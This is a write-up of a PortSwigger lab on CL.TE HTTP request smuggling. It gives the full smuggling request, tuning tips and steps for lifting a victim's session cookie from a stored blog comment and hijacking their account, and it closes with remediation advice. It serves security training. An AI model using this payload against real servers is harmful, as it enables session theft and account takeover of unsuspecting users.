# Lab 9: Exploiting HTTP request smuggling to capture other users' requests

**Category:** HTTP Request Smuggling
**Difficulty:** Practitioner
**Lab link:** [Exploiting HTTP request smuggling to capture other users' requests](https://portswigger.net/web-security/request-smuggling/exploiting/lab-capture-other-users-requests)

## Overview

The front-end uses Content-Length, the back-end uses Transfer-Encoding — classic CL.TE. By smuggling an incomplete POST to the blog comment endpoint, the back-end is left waiting for more body bytes. The next user's full HTTP request gets appended to your POST body and stored as the comment text, exposing their session cookie.

## Key Concepts

- **CL.TE smuggling:** front-end reads Content-Length, back-end reads chunked Transfer-Encoding. The `0\r\n\r\n` ends the chunked body early; remaining bytes poison the next request slot.
- **Request capture via storage sink:** POST to a comment endpoint with an intentionally large inner `Content-Length`. The back-end reads that many bytes from the socket — pulling in the next victim's request to fill the gap.
- **Comment as exfil channel:** the victim's raw request (including headers) is appended after `comment=` and stored server-side, readable by anyone who views the post.
- **Cookie theft → session hijack:** the captured request contains the victim's `Cookie: session=` header, which lets the attacker impersonate them.

## Burp Setup

- Repeater: HTTP/1.1, **"Update Content-Length" turned OFF**.
- Post a legit comment first to get a valid CSRF token and understand the body structure.
- Keep the legit comment request handy — CSRF tokens expire, so grab a fresh one for each attempt.

## Solution

### Step 1 — Note the comment POST structure

Browse to a blog post, post a comment, and capture the request:
```
POST /post/comment HTTP/1.1
...
csrf=TOKEN&postId=X&name=A&email=B&website=C&comment=D
```

### Step 2 — Craft the CL.TE smuggling request

```
POST / HTTP/1.1
Host: LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 256
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
Content-Type: application/x-www-form-urlencoded
Content-Length: 800

csrf=YOUR-CSRF-TOKEN&postId=1&name=test&email=test@test.com&website=&comment=
```

**Critical details:**
- Inner request must be `HTTP/1.1` (not HTTP/2).
- Inner request must have a `Host:` header.
- Outer `Content-Length` = exact byte count from `0` through end of body.
- Inner `Content-Length: 800` (or higher) — deliberately larger than the actual body. The gap is filled by the victim's next request.
- Body ends with `comment=` and nothing after — victim's request appends here.

### Step 3 — Send repeatedly

Keep clicking **Send** every few seconds. After each send, browse to the blog post and check for new comments. When a comment contains raw HTTP request text, you captured a victim request.

If the comment is truncated before the `Cookie:` line → increase inner `Content-Length` (try 700, 800, 1000) and retry.

### Step 4 — Extract and use the cookie

The comment will contain something like:
```
GET / HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: session=VICTIM-SESSION-TOKEN
User-Agent: ...
```

Copy `VICTIM-SESSION-TOKEN`. In your browser DevTools → Application → Cookies, replace your session value with the victim's. Navigate to `/my-account`. Lab solved.

## How It Works

1. Front-end forwards the full outer request body (256 bytes) to the back-end.
2. Back-end sees `Transfer-Encoding: chunked` → reads `0\r\n\r\n` → body ends, request complete.
3. Remaining bytes (`POST /post/comment HTTP/1.1 ...`) sit in the TCP buffer as the start of the next request.
4. When the victim's request arrives, it gets concatenated onto our hanging `POST /post/comment` body.
5. Back-end now has enough bytes to satisfy inner `Content-Length` → processes the POST.
6. Comment is stored with value = everything that was appended after `comment=`, i.e., the victim's request.

## Why CSRF Token Expires

The CSRF token is tied to the session that loaded the comment form. Each attempt needs a fresh token — navigate to the blog post and copy the token from the comment form's hidden input before each send.

## Common Errors

| Symptom | Cause | Fix |
|---|---|---|
| "Invalid comment" / 400 | Expired CSRF token | Grab a fresh token from the comment form |
| No comment appears | Outer Content-Length wrong | Recount bytes from `0` to end of body |
| Comment truncated before Cookie | Inner Content-Length too small | Increase to 700–1000 |
| Inner request rejected | Missing Host header or HTTP/2 used | Add Host, change to HTTP/1.1 |

## Remediation

- **Normalize request interpretation** at the front-end so CL and TE cannot diverge.
- **Reject ambiguous requests** that contain both Content-Length and Transfer-Encoding.
- **Isolate back-end connections** per user — never reuse a TCP connection across clients.
- **Sanitize stored input** — a comment endpoint that stores raw user input is an amplifier for any injection sink.

## Python Script

[solve.py on GitHub](https://github.com/codingvedant/burpsuite-academy-labs/blob/main/request-smuggling/lab-09-capture-other-requests/solve.py)

Automates the smuggling loop until a Cookie header is captured in the comment.

## Key Takeaways

- **CL.TE capture attack:** incomplete inner body + large Content-Length = victim request absorbed as POST body.
- **Comment endpoint = persistent exfil sink.** Any storage endpoint that reflects user-supplied data can serve this role.
- **Timing matters:** send repeatedly until a victim request lands in the window; the lab has a simulated victim browsing periodically.
- **Inner Content-Length tuning:** must exceed the actual body you send AND be large enough to capture the Cookie header from the victim's request.
